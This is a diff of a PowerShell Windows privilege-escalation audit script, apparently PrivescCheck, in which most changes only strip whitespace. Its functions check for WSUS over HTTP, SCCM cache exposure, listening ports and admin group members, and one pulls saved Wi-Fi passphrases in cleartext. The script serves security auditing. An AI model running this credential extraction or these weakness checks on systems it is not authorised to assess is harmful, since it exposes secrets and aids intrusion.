     https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
@@ -2877,14 +2877,14 @@ function Invoke-WsusConfigCheck {
         if (-not $ErrorGetItemProperty) {
 
             $WusEnabled = $UseWUServerValue.UseWUServer
-            
+
             if ($WusUrl -Like "http://*" -and $WusEnabled -eq 1) {
-                
+
                 $Result = New-Object -TypeName PSObject
                 $Result | Add-Member -MemberType "NoteProperty" -Name "WUServer" -Value $WusUrl
                 $Result | Add-Member -MemberType "NoteProperty" -Name "UseWUServer" -Value $WusEnabled
                 $Result
-            } 
+            }
         }
     }
 }
@@ -2892,21 +2892,21 @@ function Invoke-WsusConfigCheck {
 function Invoke-SccmCacheFolderCheck {
     <#
     .SYNOPSIS
-    
+
     Gets some information about the SCCM cache folder if it exists.
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     If the SCCM cache folder exists ('C:\Windows\CCMCache'), this check will return some information
     about the item, such as the ACL. This allows for further manual analysis.
-    
+
     .EXAMPLE
 
     TODO
-    
+
     #>
 
     [CmdletBinding()] param ()
@@ -2917,7 +2917,7 @@ function Invoke-SccmCacheFolderCheck {
         $Result = $SccmCacheFolderItem
         try {
             # We need a try/catch block because ErrorAction doesn't catch access denied errors
-            $Result | Add-Member -MemberType "NoteProperty" -Name "Acl" -Value $($SccmCacheFolderItem | Get-Acl -ErrorAction SilentlyContinue | Select-Object -ExpandProperty AccessToString) 
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Acl" -Value $($SccmCacheFolderItem | Get-Acl -ErrorAction SilentlyContinue | Select-Object -ExpandProperty AccessToString)
         } catch {
             # Access denied, do nothing
         }
@@ -2933,14 +2933,14 @@ function Invoke-SccmCacheFolderVulnCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    When SCCM is used to remotely install packages, a cache folder is created in the Windows 
+    When SCCM is used to remotely install packages, a cache folder is created in the Windows
     directory: 'C:\Windows\ccmcache'. MSI packages contained in this folder may contain some
-    cleartext credentials. Therefore, normal users shouldn't be allowed to browse this 
+    cleartext credentials. Therefore, normal users shouldn't be allowed to browse this
     directory.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-SccmCacheFolderVulnCheck
@@ -2948,7 +2948,7 @@ function Invoke-SccmCacheFolderVulnCheck {
     FullName   : C:\WINDOWS\CCMCache
     Attributes : Directory
     Exists     : True
-    
+
     #>
 
     [CmdletBinding()] param ()
@@ -2963,12 +2963,12 @@ function Invoke-SccmCacheFolderVulnCheck {
     }
 }
 # ----------------------------------------------------------------
-# END CONFIG   
+# END CONFIG
 # ----------------------------------------------------------------
 
 
 # ----------------------------------------------------------------
-# BEGIN NETWORK 
+# BEGIN NETWORK
 # ----------------------------------------------------------------
 function Get-RpcRange {
     <#
@@ -2978,28 +2978,28 @@ function Get-RpcRange {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    This function is a helper for the Invoke-TcpEndpointsCheck function. Windows uses a set of 
-    RPC ports that are randomly allocated in the range 49152-65535 by default. If we want to 
-    filter out these listening ports we must first figure out this set of ports. The aim of this 
-    function is to guess this range using basic statistics on a given array of port numbers. We 
-    can quite reliably identify the RPC port set because they are concentrated in a very small 
+    This function is a helper for the Invoke-TcpEndpointsCheck function. Windows uses a set of
+    RPC ports that are randomly allocated in the range 49152-65535 by default. If we want to
+    filter out these listening ports we must first figure out this set of ports. The aim of this
+    function is to guess this range using basic statistics on a given array of port numbers. We
+    can quite reliably identify the RPC port set because they are concentrated in a very small
     range. It's not 100% reliable but it will do the job most of the time.
-    
+
     .PARAMETER Ports
 
     An array of port numbers
-    
+
     .EXAMPLE
 
-    PS C:\> Get-RpcRange -Ports $Ports 
+    PS C:\> Get-RpcRange -Ports $Ports
 
     MinPort MaxPort
     ------- -------
     49664   49672
-    
+
     #>
 
     [CmdletBinding()]Param(
@@ -3016,7 +3016,7 @@ function Get-RpcRange {
             [int]$Span
         )
 
-        $Stats = @() 
+        $Stats = @()
         For ($i = $MinPort; $i -lt $MaxPort; $i += $Span) {
             $Counter = 0
             ForEach ($Port in $Ports) {
@@ -3024,17 +3024,17 @@ function Get-RpcRange {
                     $Counter += 1
                 }
             }
-            $RangeStats = New-Object -TypeName PSObject 
+            $RangeStats = New-Object -TypeName PSObject
             $RangeStats | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $i
             $RangeStats | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value ($i + $Span)
             $RangeStats | Add-Member -MemberType "NoteProperty" -Name "PortsInRange" -Value $Counter
-            $Stats += $RangeStats 
+            $Stats += $RangeStats
         }
         $Stats
     }
 
-    # We split the range 49152-65536 into blocks of size 32 and then, we take the block which has 
-    # greater number of ports in it. 
+    # We split the range 49152-65536 into blocks of size 32 and then, we take the block which has
+    # greater number of ports in it.
     $Stats = Get-Stats -Ports $Ports -MinPort 49152 -MaxPort 65536 -Span 32
 
     $MaxStat = $Null
@@ -3042,7 +3042,7 @@ function Get-RpcRange {
         if ($Stat.PortsInRange -gt $MaxStat.PortsInRange) {
             $MaxStat = $Stat
         }
-    } 
+    }
 
     For ($i = 0; $i -lt 8; $i++) {
         $Span = ($MaxStat.MaxPort - $MaxStat.MinPort) / 2
@@ -3053,12 +3053,12 @@ function Get-RpcRange {
             } elseif ($NewStats[1].PortsInRange -eq 0) {
                 $MaxStat = $NewStats[0]
             } else {
-                break 
+                break
             }
         }
     }
 
-    $RpcRange = New-Object -TypeName PSObject 
+    $RpcRange = New-Object -TypeName PSObject
     $RpcRange | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $MaxStat.MinPort
     $RpcRange | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value $MaxStat.MaxPort
     $RpcRange
@@ -3072,18 +3072,18 @@ function Invoke-TcpEndpointsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     It uses the custom "Get-NetworkEndpoints" function to enumerate all the TCP endpoints on the
     local machine, IPv4 and IPv6. The list can then be filtered based on a list of known ports.
-    
+
     .PARAMETER Filtered
 
-    Use this switch to filter out the list of endpoints returned by this function. The filter 
+    Use this switch to filter out the list of endpoints returned by this function. The filter
     excludes all the standard ports such as 445 or 139 and all the random RPC ports. The RPC port
     range is dynamically guessed using the helper function "Get-RpcRange".
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-TcpEndpointsCheck | ft
@@ -3108,7 +3108,7 @@ function Invoke-TcpEndpointsCheck {
     IPv6 TCP   [::]:49667         LISTENING 1412 svchost
     IPv6 TCP   [::]:49668         LISTENING 2416 spoolsv
     IPv6 TCP   [::]:49669         LISTENING  656 services
-    
+
     #>
 
     [CmdletBinding()]Param(
@@ -3125,10 +3125,10 @@ function Invoke-TcpEndpointsCheck {
         $AllPorts = @()
         $Endpoints | ForEach-Object { $AllPorts += $_.LocalPort }
         $AllPorts = $AllPorts | Sort-Object -Unique
-        
+
         $RpcRange = Get-RpcRange -Ports $AllPorts
         Write-Verbose "Excluding port range: $($RpcRange.MinPort)-$($RpcRange.MaxPort)"
-    
+
         $Endpoints | ForEach-Object {
 
             if (-not ($IgnoredPorts -contains $_.LocalPort)) {
@@ -3136,14 +3136,14 @@ function Invoke-TcpEndpointsCheck {
                 if ($RpcRange) {
 
                     if (($_.LocalPort -lt $RpcRange.MinPort) -or ($_.LocalPort -ge $RpcRange.MaxPort)) {
-                        
+
                         $FilteredEndpoints += $_
                     }
                 }
             }
         }
         $Endpoints = $FilteredEndpoints
-    } 
+    }
 
     $Endpoints | ForEach-Object {
         $TcpEndpoint = New-Object -TypeName PSObject
@@ -3165,17 +3165,17 @@ function Invoke-UdpEndpointsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     It uses the custom "Get-NetworkEndpoints" function to enumerate all the UDP endpoints on the
     local machine, IPv4 and IPv6. The list can be filtered based on a list of known ports.
-    
+
     .PARAMETER Filtered
 
-    Use this switch to filter out the list of endpoints returned by this function. The filter 
+    Use this switch to filter out the list of endpoints returned by this function. The filter
     excludes all the standard ports such as 139 or 500.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-UdpEndpointsCheck | ft
@@ -3200,17 +3200,17 @@ function Invoke-UdpEndpointsCheck {
     IPv6 UDP   [::1]:51006                        N/A   5088 svchost
     IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:1900  N/A   5088 svchost
     IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:51005 N/A   5088 svchost
-    
+
     #>
-    
+
     [CmdletBinding()]Param(
         [switch]$Filtered
     )
 
     # https://support.microsoft.com/en-us/help/832017/service-overview-and-network-port-requirements-for-windows
     $IgnoredPorts = @(53, 67, 123, 137, 138, 139, 500, 1701, 2535, 4500, 445, 1900, 5050, 5353, 5355)
-    
-    $Endpoints = Get-NetworkEndpoints -UDP 
+
+    $Endpoints = Get-NetworkEndpoints -UDP
     $Endpoints += Get-NetworkEndpoints -UDP -IPv6
 
     if ($Filtered) {
@@ -3225,7 +3225,7 @@ function Invoke-UdpEndpointsCheck {
 
     $Endpoints | ForEach-Object {
         if (-not ($_.Name -eq "dns")) {
-            $UdpEndpoint = New-Object -TypeName PSObject 
+            $UdpEndpoint = New-Object -TypeName PSObject
             $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $_.IP
             $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $_.Proto
             $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $_.Endpoint
@@ -3245,18 +3245,18 @@ function Invoke-WlanProfilesCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     The built-in "netsh" command allows one to list the saved Wifi profiles and extract the cleartext
     key or passphrase when applicable (e.g.: "netsh wlan show profile MyWifiProfile key=clear"). This
     function achieves the same goal. It iterates the list of Wlan interfaces in order to enumerate
-    all the Wifi profiles which can be accessed in the context of the current user. If a network is 
+    all the Wifi profiles which can be accessed in the context of the current user. If a network is
     configured with WEP or PSK authentication, it will attempt to extract the cleartext value of the
-    key or passphrase. 
-    
+    key or passphrase.
+
     .EXAMPLE
-    
+
     PS C:\> Invoke-WlanProfilesCheck
 
     Profile        : MySecretAccessPoint
@@ -3264,7 +3264,7 @@ function Invoke-WlanProfilesCheck {
     Authentication : WPA2PSK
     PassPhrase     : AvErYsEcReTpAsSpHrAsE
     Interface      : Compact Wireless-G USB Network Adapter
-    
+
     #>
 
     [CmdletBinding()] param()
@@ -3278,7 +3278,7 @@ function Invoke-WlanProfilesCheck {
         $Xml = [xml] $ProfileXml
 
         $Name = $Xml.WLANProfile.name
-        $Ssid = $Xml.WLANProfile.SSIDConfig.SSID.name 
+        $Ssid = $Xml.WLANProfile.SSIDConfig.SSID.name
         $Authentication = $Xml.WLANProfile.MSM.security.authEncryption.authentication
         $PassPhrase = $Xml.WLANProfile.MSM.security.sharedKey.keyMaterial
 
@@ -3297,83 +3297,83 @@ function Invoke-WlanProfilesCheck {
         $NegotiatedVersion = 0
         $Result = [PrivescCheck.Win32]::WlanOpenHandle(2, [IntPtr]::Zero, [ref]$NegotiatedVersion, [ref]$ClientHandle)
         if ($Result -eq $ERROR_SUCCESS) {
-    
+
             Write-Verbose "WlanOpenHandle() OK - Handle: $($ClientHandle)"
-    
+
             [IntPtr]$InterfaceListPtr = [IntPtr]::Zero
             $Result = [PrivescCheck.Win32]::WlanEnumInterfaces($ClientHandle, [IntPtr]::Zero, [ref]$InterfaceListPtr)
             if ($Result -eq $ERROR_SUCCESS) {
-    
+
                 Write-Verbose "WlanEnumInterfaces() OK - Interface list pointer: 0x$($InterfaceListPtr.ToString('X8'))"
-    
+
                 $NumberOfInterfaces = [Runtime.InteropServices.Marshal]::ReadInt32($InterfaceListPtr)
                 Write-Verbose "Number of Wlan interfaces: $($NumberOfInterfaces)"
-    
-                # Calculate the pointer to the first WLAN_INTERFACE_INFO structure 
+
+                # Calculate the pointer to the first WLAN_INTERFACE_INFO structure
                 $WlanInterfaceInfoPtr = [IntPtr] ($InterfaceListPtr.ToInt64() + 8) # dwNumberOfItems + dwIndex
-    
+
                 for ($i = 0; $i -lt $NumberOfInterfaces; $i++) {
-    
+
                     $WlanInterfaceInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WlanInterfaceInfoPtr, [type] [PrivescCheck.Win32+WLAN_INTERFACE_INFO])
-    
+
                     Write-Verbose "Wlan interface: $($WlanInterfaceInfo.strInterfaceDescription)"
-    
+
                     [IntPtr]$ProfileListPtr = [IntPtr]::Zero
                     $Result = [PrivescCheck.Win32]::WlanGetProfileList($ClientHandle, $WlanInterfaceInfo.InterfaceGuid, [IntPtr]::Zero, [ref]$ProfileListPtr)
                     if ($Result -eq $ERROR_SUCCESS) {
-    
+
                         Write-Verbose "WlanGetProfileList() OK - Profile list pointer: 0x$($ProfileListPtr.ToString('X8'))"
-    
+
                         $NumberOfProfiles = [Runtime.InteropServices.Marshal]::ReadInt32($ProfileListPtr)
                         Write-Verbose "Number of profiles: $($NumberOfProfiles)"
-    
-                        # Calculate the pointer to the first WLAN_PROFILE_INFO structure 
+
+                        # Calculate the pointer to the first WLAN_PROFILE_INFO structure
                         $WlanProfileInfoPtr = [IntPtr] ($ProfileListPtr.ToInt64() + 8) # dwNumberOfItems + dwIndex
-    
+
                         for ($j = 0; $j -lt $NumberOfProfiles; $j++) {
-    
+
                             $WlanProfileInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WlanProfileInfoPtr, [type] [PrivescCheck.Win32+WLAN_PROFILE_INFO])
-    
+
                             Write-Verbose "Wlan profile: $($WlanProfileInfo.strProfileName)"
-    
+
                             [string]$ProfileXml = ""
                             [UInt32]$WlanProfileFlags = 4 # WLAN_PROFILE_GET_PLAINTEXT_KEY
                             [UInt32]$WlanProfileAccessFlags = 0
                             $Result = [PrivescCheck.Win32]::WlanGetProfile($ClientHandle, $WlanInterfaceInfo.InterfaceGuid, $WlanProfileInfo.strProfileName, [IntPtr]::Zero, [ref]$ProfileXml, [ref]$WlanProfileFlags, [ref]$WlanProfileAccessFlags)
                             if ($Result -eq $ERROR_SUCCESS) {
-    
+
                                 Write-Verbose "WlanGetProfile() OK"
-    
+
                                 $Item = Convert-ProfileXmlToObject -ProfileXml $ProfileXml
                                 $Item | Add-Member -MemberType "NoteProperty" -Name "Interface" -Value $WlanInterfaceInfo.strInterfaceDescription
                                 $Item
-    
+
                             } else {
                                 Write-Verbose "WlanGetProfile() failed (Err: $($Result))"
                             }
-    
-                            # Calculate the pointer to the next WLAN_PROFILE_INFO structure 
+
+                            # Calculate the pointer to the next WLAN_PROFILE_INFO structure
                             $WlanProfileInfoPtr = [IntPtr] ($WlanProfileInfoPtr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($WlanProfileInfo))
                         }
-    
+
                         # cleanup
                         [PrivescCheck.Win32]::WlanFreeMemory($ProfileListPtr)
-    
+
                     } else {
                         Write-Verbose "WlanGetProfileList() failed (Err: $($Result))"
                     }
-    
-                    # Calculate the pointer to the next WLAN_INTERFACE_INFO structure 
+
+                    # Calculate the pointer to the next WLAN_INTERFACE_INFO structure
                     $WlanInterfaceInfoPtr = [IntPtr] ($WlanInterfaceInfoPtr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($WlanInterfaceInfo))
                 }
-    
+
                 # cleanup
                 [PrivescCheck.Win32]::WlanFreeMemory($InterfaceListPtr)
-    
+
             } else {
                 Write-Verbose "WlanEnumInterfaces() failed (Err: $($Result))"
             }
-    
+
             # cleanup
             $Result = [PrivescCheck.Win32]::WlanCloseHandle($ClientHandle, [IntPtr]::Zero)
             if ($Result -eq $ERROR_SUCCESS) {
@@ -3381,21 +3381,21 @@ function Invoke-WlanProfilesCheck {
             } else {
                 Write-Verbose "WlanCloseHandle() failed (Err: $($Result))"
             }
-    
+
         } else {
             Write-Verbose "WlanOpenHandle() failed (Err: $($Result))"
         }
     } catch {
         # Do nothing
-        # Wlan API doesn't exist on this machine probably 
+        # Wlan API doesn't exist on this machine probably
     }
 }
 # ----------------------------------------------------------------
-# END NETWORK    
+# END NETWORK
 # ----------------------------------------------------------------
 
 # ----------------------------------------------------------------
-# BEGIN MISC   
+# BEGIN MISC
 # ----------------------------------------------------------------
 function Invoke-SystemInfoCheck {
     <#
@@ -3405,25 +3405,25 @@ function Invoke-SystemInfoCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Reads the "Product Name" from the registry and gets the full version string based on the 
+    Reads the "Product Name" from the registry and gets the full version string based on the
     operating system.
-    
+
     .EXAMPLE
 
     Invoke-SystemInfoCheck | fl
 
     Name    : Windows 10 Home
     Version : 10.0.18363 Version 1909 (18363.535)
-    
+
     .LINK
 
     https://techthoughts.info/windows-version-numbers/
 
     #>
-    
+
     [CmdletBinding()] param()
 
     $OsName = ""
@@ -3437,7 +3437,7 @@ function Invoke-SystemInfoCheck {
         if ($OsVersion -like "10.*") {
             # Windows >= 10/2016
             $OsVersion = "$($Item.CurrentMajorVersionNumber).$($Item.CurrentMinorVersionNumber).$($Item.CurrentBuild) Version $($Item.ReleaseId) ($($Item.CurrentBuild).$($Item.UBR))"
-        } 
+        }
 
         $SystemInfoResult = New-Object -TypeName PSObject
         $SystemInfoResult | Add-Member -MemberType NoteProperty -Name "Name" -Value $OsName
@@ -3457,16 +3457,16 @@ function Invoke-SystemStartupHistoryCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     It uses the Event Log to get a list of all the events that indicate a system startup. The start
     event of the Event Log service is used as a reference.
-    
+
     .PARAMETER TimeSpanInDays
 
     An optional parameter indicating the time span to check in days. e.g.: check the last 31 days.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-SystemStartupHistoryCheck
@@ -3487,13 +3487,13 @@ function Invoke-SystemStartupHistoryCheck {
         12 2019-12-26 - 10:56:38
         13 2019-12-25 - 12:12:14
         14 2019-12-24 - 17:41:04
-    
+
     .NOTES
 
     Event ID 6005: The Event log service was started, i.e. system startup theoretically.
 
     #>
-    
+
     [CmdletBinding()] param(
         [int]
         $TimeSpanInDays = 31
@@ -3510,7 +3510,7 @@ function Invoke-SystemStartupHistoryCheck {
         $EventNumber = 1
 
         ForEach ($Event in $StartupEvents) {
-            $SystemStartupHistoryItem = New-Object -TypeName PSObject 
+            $SystemStartupHistoryItem = New-Object -TypeName PSObject
             $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Index" -Value $EventNumber
             $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(Convert-DateToString -Date $Event.TimeGenerated)"
             [void]$SystemStartupHistoryResult.Add($SystemStartupHistoryItem)
@@ -3527,19 +3527,19 @@ function Invoke-SystemStartupHistoryCheck {
 function Invoke-SystemStartupCheck {
     <#
     .SYNOPSIS
-    
+
     Gets the last system startup time
-    
+
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Gets the tickcount in milliseconds thanks to the GetTickCount64 Win32 function and substracts
-    the value to the current date. This yields the date and time of the last system startup. The 
+    the value to the current date. This yields the date and time of the last system startup. The
     result is returned in a custom PS Object containing a string representation of the DateTime
-    object. 
-    
+    object.
+
     .EXAMPLE
 
     PS C:\> Invoke-SystemStartupCheck
@@ -3552,10 +3552,10 @@ function Invoke-SystemStartupCheck {
 
     [Environment]::TickCount is a 32-bit signed integer
     The max value it can hold is 49.7 days. That's why GetTickCount64() is used instead.
-    
+
     #>
-    
-    [CmdletBinding()] param() 
+
+    [CmdletBinding()] param()
 
     try {
         $TickcountMilliseconds = [PrivescCheck.Win32]::GetTickCount64()
@@ -3565,7 +3565,7 @@ function Invoke-SystemStartupCheck {
         $SystemStartupResult = New-Object -TypeName PSObject
         $SystemStartupResult | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(Convert-DateToString -Date $StartupDate)"
         $SystemStartupResult
-    
+
     } catch {
         # We are dealing with the Windows API so let's silently catch any exception, just in case...
     }
@@ -3579,23 +3579,23 @@ function Invoke-SystemDrivesCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    This function is a wrapper for the "Get-PSDrive" standard cmdlet. For each result returned by 
+    This function is a wrapper for the "Get-PSDrive" standard cmdlet. For each result returned by
     "Get-PSDrive", a custom PS object is returned, indicating the drive letter (if applicable), the
     display name (if applicable) and the description.
-    
+
     .EXAMPLE
 
-    PS C:\> Invoke-SystemDrivesCheck 
+    PS C:\> Invoke-SystemDrivesCheck
 
     Root DisplayRoot Description
     ---- ----------- -----------
     C:\              OS
     E:\              DATA
     #>
-    
+
     [CmdletBinding()] param()
 
     $SystemDrivesResult = New-Object -TypeName System.Collections.ArrayList
@@ -3621,12 +3621,12 @@ function Invoke-LocalAdminGroupCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     For every member of the local admin group, it will check whether it's a local/domain user/group.
-    If it's local it will also check if the account is enabled. 
-    
+    If it's local it will also check if the account is enabled.
+
     .EXAMPLE
 
     PS C:\> Invoke-LocalAdminGroupCheck
@@ -3635,10 +3635,10 @@ function Invoke-LocalAdminGroupCheck {
     ----          ---- ------- ---------
     Administrator User    True     False
     lab-admin     User    True      True
-    
+
     .NOTES
 
-    S-1-5-32-544 = SID of the local admin group 
+    S-1-5-32-544 = SID of the local admin group
 
     #>
 
@@ -3673,8 +3673,8 @@ function Invoke-LocalAdminGroupCheck {
             "ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION" = "16777216";
         }
 
-        $UserFlagsEnum.GetEnumerator() | ForEach-Object { 
-            if ( $_.value -band $UserFlags ) 
+        $UserFlagsEnum.GetEnumerator() | ForEach-Object {
+            if ( $_.value -band $UserFlags )
             {
                 $_.name
             }
@@ -3696,28 +3696,28 @@ function Invoke-LocalAdminGroupCheck {
             "ADS_GROUP_TYPE_SECURITY_ENABLED" = "2147483648"; # Specifies a security-enabled group.
         }
 
-        $GroupFlagsEnum.GetEnumerator() | ForEach-Object { 
-            if ($_.value -band $GroupFlags) 
+        $GroupFlagsEnum.GetEnumerator() | ForEach-Object {
+            if ($_.value -band $GroupFlags)
             {
                 $_.name
             }
         }
     }
 
-    $LocalAdminGroupSid = "S-1-5-32-544" # Local admin group SID 
+    $LocalAdminGroupSid = "S-1-5-32-544" # Local admin group SID
     $LocalAdminGroupFullname = ([Security.Principal.SecurityIdentifier]$LocalAdminGroupSid).Translate([Security.Principal.NTAccount]).Value
     $LocalAdminGroupName = $LocalAdminGroupFullname.Split('\')[1]
 
     $Computer = $env:COMPUTERNAME
-    $AdsiComputer = [ADSI]("WinNT://$Computer,computer") 
+    $AdsiComputer = [ADSI]("WinNT://$Computer,computer")
 
     try {
-        $LocalAdminGroup = $AdsiComputer.psbase.children.find($LocalAdminGroupName, "Group") 
+        $LocalAdminGroup = $AdsiComputer.psbase.children.find($LocalAdminGroupName, "Group")
 
         if ($LocalAdminGroup) {
             $LocalAdminGroup.psbase.invoke("members") | ForEach-Object {
-                # For each member of the local admin group 
-                
+                # For each member of the local admin group
+
                 $MemberName = $_.GetType().InvokeMember("Name",  'GetProperty',  $null,  $_, $null)
                 $Member = $Null
 
@@ -3726,7 +3726,7 @@ function Invoke-LocalAdminGroupCheck {
                     if ($_.Name -eq $MemberName) {
                         Write-Verbose "Found user: $MemberName"
                         $Member = $_
-                    } 
+                    }
                 }
 
                 # if it's not a local user, is it a local grop ?
@@ -3742,7 +3742,7 @@ function Invoke-LocalAdminGroupCheck {
                 if ($Member) {
                     if ($Member.SchemaClassName -eq "User") {
                         $UserFlags = $Member.UserFlags.value
-                        $Flags = Get-UserFlags $UserFlags 
+                        $Flags = Get-UserFlags $UserFlags
                         $MemberType = "User"
                         $MemberIsLocal = $True
                         $MemberIsEnabled = $(-not ($Flags -contains "ADS_UF_ACCOUNTDISABLE"))
@@ -3751,22 +3751,22 @@ function Invoke-LocalAdminGroupCheck {
                         $Flags = Get-GroupFlags $GroupType
                         $MemberType = "Group"
                         $MemberIsLocal = $($Flags -contains "ADS_GROUP_TYPE_RESOURCE_GROUP")
-                        $MemberIsEnabled = $True 
+                        $MemberIsEnabled = $True
                     }
                 } else {
                     $MemberType = ""
                     $MemberIsLocal = $False
-                    $MemberIsEnabled = $Null 
+                    $MemberIsEnabled = $Null
                 }
 
-                $LocalAdminGroupResultItem = New-Object -TypeName PSObject 
+                $LocalAdminGroupResultItem = New-Object -TypeName PSObject
                 $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $MemberName
                 $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $MemberType
-                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsLocal" -Value $MemberIsLocal  
-                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsEnabled" -Value $MemberIsEnabled 
+                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsLocal" -Value $MemberIsLocal
+                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsEnabled" -Value $MemberIsEnabled
                 $LocalAdminGroupResultItem
             }
-        } 
+        }
     } catch {
         Write-Verbose $_.Exception
     }
@@ -3775,17 +3775,17 @@ function Invoke-LocalAdminGroupCheck {
 function Invoke-UsersHomeFolderCheck {
     <#
     .SYNOPSIS
-    
+
     Enumerates the local user home folders.
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Enumerates the folders located in C:\Users\. For each one, this function checks whether the 
-    folder is readable and/or writable by the current user. 
-    
+    Enumerates the folders located in C:\Users\. For each one, this function checks whether the
+    folder is readable and/or writable by the current user.
+
     .EXAMPLE
 
     PS C:\> Invoke-UsersHomeFolderCheck
@@ -3795,11 +3795,11 @@ function Invoke-UsersHomeFolderCheck {
     C:\Users\Lab-Admin    False False
     C:\Users\Lab-User      True  True
     C:\Users\Public        True  True
-    
+
     #>
 
     [CmdletBinding()] param()
-    
+
     $UsersHomeFolder = Join-Path -Path $((Get-Item $env:windir).Root) -ChildPath Users
 
     Get-ChildItem -Path $UsersHomeFolder | ForEach-Object {
@@ -3808,10 +3808,10 @@ function Invoke-UsersHomeFolderCheck {
         $ReadAccess = $False
         $WriteAccess = $False
 
-        $Null = Get-ChildItem -Path $FolderPath -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem 
+        $Null = Get-ChildItem -Path $FolderPath -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem
         if (-not $ErrorGetChildItem) {
 
-            $ReadAccess = $True 
+            $ReadAccess = $True
 
             $ModifiablePaths = $FolderPath | Get-ModifiablePath -LiteralPaths
             if (([object[]]$ModifiablePaths).Length -gt 0) {
@@ -3819,7 +3819,7 @@ function Invoke-UsersHomeFolderCheck {
             }
         }
 
-        $UserHomFolderResultItem = New-Object -TypeName PSObject 
+        $UserHomFolderResultItem = New-Object -TypeName PSObject
         $UserHomFolderResultItem | Add-Member -MemberType "NoteProperty" -Name "HomeFolderPath" -Value $FolderPath
         $UserHomFolderResultItem | Add-Member -MemberType "NoteProperty" -Name "Read" -Value $ReadAccess
         $UserHomFolderResultItem | Add-Member -MemberType "NoteProperty" -Name "Write" -Value $WriteAccess
@@ -3835,21 +3835,21 @@ function Invoke-MachineRoleCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     The role of the machine can be checked by reading the following registry key:
     HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
     The "ProductType" value represents the role of the machine.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-MachineRoleCheck
 
-    Name  Role       
-    ----  ----       
+    Name  Role
+    ----  ----
     WinNT WorkStation
-    
+
     .NOTES
 
     WinNT = workstation
@@ -3857,13 +3857,13 @@ function Invoke-MachineRoleCheck {
     ServerNT = server
 
     #>
-    
+
     [CmdletBinding()] param()
 
-    $MachineRoleResult = New-Object -TypeName PSObject 
+    $MachineRoleResult = New-Object -TypeName PSObject
 
     $Item = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
-    
+
     $FriendlyNames = @{
         "WinNT" = "WorkStation";
         "LanmanNT" = "Domain Controller";
@@ -3875,7 +3875,7 @@ function Invoke-MachineRoleCheck {
             $MachineRoleResult = New-Object -TypeName PSObject
             $MachineRoleResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Item.ProductType
             $MachineRoleResult | Add-Member -MemberType "NoteProperty" -Name "Role" -Value $FriendlyNames[$Item.ProductType]
-            $MachineRoleResult 
+            $MachineRoleResult
         } catch {
             Write-Verbose "Hashtable error."
         }
@@ -3890,12 +3890,12 @@ function Invoke-WindowsUpdateCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     The Windows Update status can be queried thanks to the Microsoft.Update.AutoUpdate COM object.
     It gives the last successful search time and the last successfull update installation time.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-WindowsUpdateCheck
@@ -3905,18 +3905,18 @@ function Invoke-WindowsUpdateCheck {
     2020-01-12 - 09:17:37
 
     #>
-    
+
     [CmdletBinding()] param()
 
     try {
         $WindowsUpdate = (New-Object -ComObject "Microsoft.Update.AutoUpdate").Results
 
         if ($WindowsUpdate.LastInstallationSuccessDate) {
-            $WindowsUpdateResult = New-Object -TypeName PSObject 
